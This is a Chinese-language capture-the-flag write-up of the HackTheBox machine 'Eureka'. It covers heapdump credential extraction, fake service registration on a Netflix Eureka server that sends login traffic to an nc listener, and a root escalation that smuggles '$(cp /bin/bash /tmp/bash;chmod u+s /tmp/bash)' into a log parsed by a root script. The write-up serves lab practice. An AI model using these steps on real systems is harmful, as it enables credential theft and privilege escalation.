---
title: "HTB-Eureka"
date: 2025-04-29
categories: 
  - "HTB-Machine"
tags: 
  - "hackthebox"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Hard |

## Nmap

```
[root@kali] /home/kali/Eureka  
❯ nmap Eureka.htb -sV -A    

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

添加**furni.htb**到**/etc/hosts**

## Nuclei

```
[root@kali] /home/kali/Eureka  
❯ nuclei -u http://furni.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Current nuclei version: v3.4.2 (latest)
[INF] Current nuclei-templates version: v10.2.0 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 268
[INF] Templates loaded for current scan: 7894
[INF] Executing 7697 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 197 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1730 (Reduced 1626 Requests)
[INF] Using Interactsh Server: oast.me
[missing-sri] [http] [info] http://furni.htb ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"]
[waf-detect:nginxgeneric] [http] [info] http://furni.htb
[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump
[ssh-auth-methods] [javascript] [info] furni.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] furni.htb:22
[ssh-sha1-hmac-algo] [javascript] [info] furni.htb:22
[ssh-server-enumeration] [javascript] [info] furni.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12"]
[openssh-detect] [tcp] [info] furni.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12"]
[springboot-features] [http] [low] http://furni.htb/actuator/features
[nginx-version] [http] [info] http://furni.htb ["nginx/1.18.0"]
[spring-detect] [http] [info] http://furni.htb/error
[springboot-configprops] [http] [low] http://furni.htb/actuator/configprops
[springboot-threaddump] [http] [low] http://furni.htb/actuator/threaddump
[springboot-beans] [http] [low] http://furni.htb/actuator/beans
```

下载这个**heapdump**

## JDumpspider

- [whwlsfb/JDumpSpider: HeapDump敏感信息提取工具](https://github.com/whwlsfb/JDumpSpider)

```
[root@kali] /home/kali/Eureka  
❯ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
===========================================
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190

===========================================
WeblogicDataSourceConnectionPoolConfig
-------------
not found!

===========================================
MongoClient
-------------
not found!

===========================================
AliDruidDataSourceWrapper
-------------
not found!

===========================================
HikariDataSource
-------------
java.lang.NumberFormatException: Cannot parse null string
not found!

===========================================
RedisStandaloneConfiguration
-------------
not found!

===========================================
JedisClient
-------------
not found!

===========================================
CookieRememberMeManager(ShiroKey)
-------------
not found!

===========================================
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc
spring.jpa.hibernate.ddl-auto = none

===========================================
MutablePropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
local.server.port = null
spring.cloud.client.hostname = eureka

===========================================
MapPropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
spring.cloud.client.hostname = eureka
local.server.port = null

===========================================
ConsulPropertySources
-------------
not found!

===========================================
JavaProperties
-------------
not found!

===========================================
ProcessEnvironment
-------------
not found!

===========================================
OSS
-------------
org.jboss.logging.provider = slf4j

===========================================
UserPassSearcher
-------------
org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter:
[oauth2LoginEnabled = false, passwordParameter = password, formLoginEnabled = true, usernameParameter = username, loginPageUrl = /login, authenticationUrl = /login, saml2LoginEnabled = false, failureUrl = /login?error]
[oauth2LoginEnabled = false, formLoginEnabled = false, saml2LoginEnabled = false]

org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter:
[passwordParameter = password, usernameParameter = username]

org.antlr.v4.runtime.atn.LexerATNConfig:
[passedThroughNonGreedyDecision = false]

org.antlr.v4.runtime.atn.ATNDeserializationOptions:
[generateRuleBypassTransitions = false]

org.hibernate.boot.internal.InFlightMetadataCollectorImpl:
[inSecondPass = false]

com.mysql.cj.protocol.a.authentication.AuthenticationLdapSaslClientPlugin:
[firstPass = true]

com.mysql.cj.protocol.a.authentication.CachingSha2PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.protocol.a.authentication.Sha256PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.NativeCharsetSettings:
[platformDbCharsetMatches = true]

com.mysql.cj.protocol.a.NativeAuthenticationProvider:
[database = Furni_WebApp_DB, useConnectWithDb = true, serverDefaultAuthenticationPluginName = mysql_native_password, username = oscar190]

com.mysql.cj.jdbc.ConnectionImpl:
[password = 0sc@r190_S0l!dP@sswd, database = Furni_WebApp_DB, origHostToConnectTo = localhost, user = oscar190]

com.mysql.cj.conf.HostInfo:
[password = 0sc@r190_S0l!dP@sswd, host = localhost, user = oscar190]

com.zaxxer.hikari.pool.HikariPool:
[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]

org.springframework.cloud.netflix.eureka.EurekaClientConfigBean:
[eurekaServerConnectTimeoutSeconds = 5, useDnsForFetchingServiceUrls = false, eurekaServerReadTimeoutSeconds = 8, eurekaServerTotalConnections = 200, eurekaServiceUrlPollIntervalSeconds = 300, eurekaServerTotalConnectionsPerHost = 50]

org.springframework.boot.autoconfigure.security.SecurityProperties$User:
[password = 4312eecb-54e8-46b9-a645-5b9df3ea21d8, passwordGenerated = true]

org.springframework.boot.autoconfigure.jdbc.DataSourceProperties:
[password = 0sc@r190_S0l!dP@sswd, driverClassName = com.mysql.cj.jdbc.Driver, url = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]

org.springframework.security.authentication.dao.DaoAuthenticationProvider:
[hideUserNotFoundExceptions = true]

com.zaxxer.hikari.HikariDataSource:
[keepaliveTime = 0, password = 0sc@r190_S0l!dP@sswd, jdbcUrl = jdbc:mysql://localhost:3306/Furni_WebApp_DB, driverClassName = com.mysql.cj.jdbc.Driver, username = oscar190]

org.apache.catalina.startup.Tomcat:
[hostname = localhost]

===========================================
CookieThief
-------------
not found!

===========================================
AuthThief
-------------
java.util.LinkedHashMap$Entry:
org.springframework.security.config.annotation.authentication.configuration.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer = o.s.s.c.a.a.c.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer
org.springframework.security.config.annotation.authentication.configuration.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer = o.s.s.c.a.a.c.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer

===========================================
```

这个账户不能登录后台但是能够**ssh**

![](./images/image-157.png)

查看到内网有**8761**端口开放

```
oscar190@eureka:/$ ss -tuln
Netid        State         Recv-Q        Send-Q                     Local Address:Port                  Peer Address:Port        Process        
udp          UNCONN        0             0                          127.0.0.53%lo:53                         0.0.0.0:*                          
udp          UNCONN        0             0                                      *:37775                            *:*                          
udp          UNCONN        0             0                                      *:58808                            *:*                          
tcp          LISTEN        0             511                              0.0.0.0:80                         0.0.0.0:*                          
tcp          LISTEN        0             4096                       127.0.0.53%lo:53                         0.0.0.0:*                          
tcp          LISTEN        0             128                              0.0.0.0:22                         0.0.0.0:*                          
tcp          LISTEN        0             80                             127.0.0.1:3306                       0.0.0.0:*                          
tcp          LISTEN        0             4096                  [::ffff:127.0.0.1]:8080                             *:*                          
tcp          LISTEN        0             511                                 [::]:80                            [::]:*                          
tcp          LISTEN        0             100                   [::ffff:127.0.0.1]:8081                             *:*                          
tcp          LISTEN        0             100                   [::ffff:127.0.0.1]:8082                             *:*                          
tcp          LISTEN        0             128                                 [::]:22                            [::]:*                          
tcp          LISTEN        0             100                                    *:8761                             *:*    
```

在**heapdump**里面进行查找匹配，得到一个新的网址

```
[root@kali] /home/kali/Eureka  
❯ strings heapdump | grep 8761 -n    
227464:P`http://localhost:8761/eureka/
344576:http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
366651:http://localhost:8761/eureka/!
442796:http://localhost:8761/eureka/!
450355:Host: localhost:8761
450870:http://localhost:8761/eureka/!
451153:Host: localhost:8761
```

将**8761**端口进行转发出来

```
[root@kali] /home/kali/Eureka  
❯ ssh oscar190@furni.htb -L 8761:127.0.0.1:8761   
```

访问需要输入用户名密码，用**URL**中给出的就可以进去

```
username:EurekaSrvr
password:0scarPWDisTheB3st
```

![](./images/image-158.png)

## What is Eureka?

`Eureak` 是`Netflix` 开源微服务框架中一系列项目中的一个。`Spring Cloud`对其进行了二次封装,形成了`Spring Cloud Netflix` 子项目,但未对`Netflix`微服务实现原理进行更改,只是进行了`Spring Boot`化,使开发者更容易使用和整合。

- [什么是Eureka？Eureka能干什么？Eureka怎么用？-CSDN博客](https://blog.csdn.net/weixin_43888891/article/details/125325794)

## Hacking Netflix Eureka

经过搜索我找到了这样一篇文章

- [Hacking Netflix Eureka | Backbase Engineering](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka)

在**apps**目录下可以看到这样的服务

![](./images/image-159.png)

因此，我们可以伪造注册一个服务到 **Eureka Server**

```
oscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.xx.xx",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.xx.xx",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```

然后在本机监听

```
[root@kali] /home/kali/Eureka  
❯ nc -lvnp 8081                                                                                                                               

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=s0919JB_yc9-10PPrDWFranrfB0lKpnkPrcW4i6rgNDPpJrk1ypFwPRG_fpTsSb2mRixz5vdUSVAS6jJDI9z0xyetuX2wvnc# 

#miranda-wise
#IL!veT0Be&BeT0L0ve                                                                                                                      
```

![](./images/image-160.png)

## Root

查看后台进程，可以发现这个脚本一直在被执行

![](./images/image-161.png)

```
miranda-wise@eureka:/opt$ ls -al
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx--- 2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x--- 2 root root     4096 Apr  9 18:34 scripts
miranda-wise@eureka:/opt$ cat log_analyse.sh 
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi

analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}

analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}

analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}

display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}

# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

关键点在这里👇

这里的 `[[ "$existing_code" -eq "$code" ]]`，是 **算术比较**，`$code` 中一旦嵌入 `$(...)`，**Bash 会先执行括号内的命令**。

```
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```

类似提权的机器可以参考一下：[HackMyVM | Todd](https://hackmyvm.eu/machines/machine.php?vm=Todd)

注意到当前的目录所有者，因此可以覆盖**application.log**

```
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ ls -al
total 48
drwxrwxr-x 2 www-data developers  4096 Apr 29 04:12 .
drwxrwxr-x 6 www-data developers  4096 Mar 18 21:17 ..
-rw-r--r-- 1 www-data www-data   21254 Apr 29 04:34 application.log
-rw-rw-r-- 1 www-data www-data    5702 Apr 23 07:37 application.log.2025-04-22.0.gz
-rw-rw-r-- 1 www-data www-data    5956 Apr 29 03:13 application.log.2025-04-23.0.gz
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
```

写入恶意代码

```
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log
rm: remove write-protected regular file 'application.log'? y
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
```

![](./images/image-162.png)

## Summary

`User`：**heapdump**导致的密码泄露，内网端口上的**Eureka**服务存在漏洞，通过注册一个伪造的微服务实例，并获取到了用户凭证。

`Root`：分析脚本可以看到存在数组比较的漏洞，这个我刚好在Todd靶机中做过，当前用户组可以修改日志文件，从而达到提权。
